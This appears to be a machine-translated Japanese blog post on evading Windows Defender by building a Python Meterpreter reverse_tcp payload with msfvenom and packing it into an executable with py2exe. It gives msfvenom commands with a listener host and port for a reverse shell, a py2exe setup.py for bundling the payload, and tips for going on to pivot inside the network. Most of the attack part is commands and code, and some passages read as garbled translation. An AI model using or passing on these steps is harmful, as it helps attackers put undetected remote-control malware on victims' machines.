Windows Defenderを安く陽気に回避する：Pythonを介したMeterPreterセッション


みなさん、こんにちは。今日は、最新のパッチ（Windows Defenderを含む）がインストールされたWindows 10マシン上でMeterpreterセッションを実行するオプションについて検討します。また、アンチウイルスもバイパスします。Meterpreterは、実行時に動的に拡張できる高度な多機能充填（ペイロード、負荷）です。通常の状況では、これにより基本的なシェルが提供され、必要に応じて新しい機能を追加できます。
Pythonを使用してこれを行い、ウイルス対策ツールの動作を確認します。

「犠牲者のマシンでexeを実行するにはPythonが必要ですか？」という質問を予測すると、すぐに回答します-いいえ、必要ありません。すべてがすでに内部にあります。

この記事では、以下を使用します。

  • 更新されたデータベースでWindows Defenderを有効にしたWindows 10（被害者のコンピューター192.168.1.113）;
  • metasploitおよびmsfvenom（192.168.1.126）を使用するためのKali Linux。
  • バイナリ（私たちの研究室では被害者のコンピューターと一致します）とインストールされたバイナリを組み立てるためのWindows 10。
  • Python（3ですが、2でも表示されます）;
  • py2exe。

まず、問題の概要を説明します。標準の負荷でexeファイルを作成し、それを被害者のマシンにコピーして、それが何をもたらすかを確認します。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.126 LPORT=9001 -f exe > hunt.exe

私たちは、昔からの友人であるWindows Defenderから警告を受けています。


VirusTotalに尋ねると、彼は次のように言います。Pythonを



実行して、私たち全員が集まったことを実行してみましょう。

Python / meterpreter / reverse_tcpは、侵入先のコンピューターをリモートで制御できるようにする独自のクロスプラットフォームペイロードMetasploit Frameworkです。どのプラットフォームを選択するかを考える必要はありません。どのプラットフォームでも機能しますが、この場合はWindowsから実行可能ファイルを作成します。

まず、py2exeパッケージをインストールします。これにより、PythonスクリプトからWindows実行可能ファイルを作成できます。

Python 3.4にします（上記のすべてはpy2exeをサポートしていません）。

py -3.4 –m pip install py2exe

または

pip install py2exe

次に、拡張子.pyを使用して未加工のPythonコードを作成します。

msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.126 LPORT=9001 -f raw > hunt.py

また、msfvenomの出力では、getpassインポートを追加する必要がありますが、彼は自分で忘れていました。最終的には、次のようになります。

同時に、Pythonの第2バージョンがある場合の対処方法を見てみましょう。

  1. Python 2用のpy2exeのダウンロード
  2. 拡張子が.pyのペイロードを生成する
  3. setup.pyファイルを作成し、そこに次のように書き込みます。

    from distutils.core import setup
import py2exe
setup(
name = ‘Meter’,
description = ‘Python-based App’,
version = ‘1.0’,
console=[‘hunt.py’],
options = {‘py2exe’: {‘bundle_files’: 1,’packages’:’ctypes’,’includes’: ‘base64,sys,socket,struct,time,code,platform,getpass,shutil’,}},
zipfile = None,
) 
  4. python.exe .\setup.py py2exe


すべてが同じでなければなりません。

その結果、python meterpreterシェルは、使い慣れたWindows meterpreterに比べて機能が劣っています。たとえば、プロセスに移行したり、getsystemタイプのコマンドを使用したりすることはできませんが、これは実際の代替手段です。msf（少なくともルーティングとportfwd）を操作するためのセッションを取得し、ネットワーク内で作業を続けます。
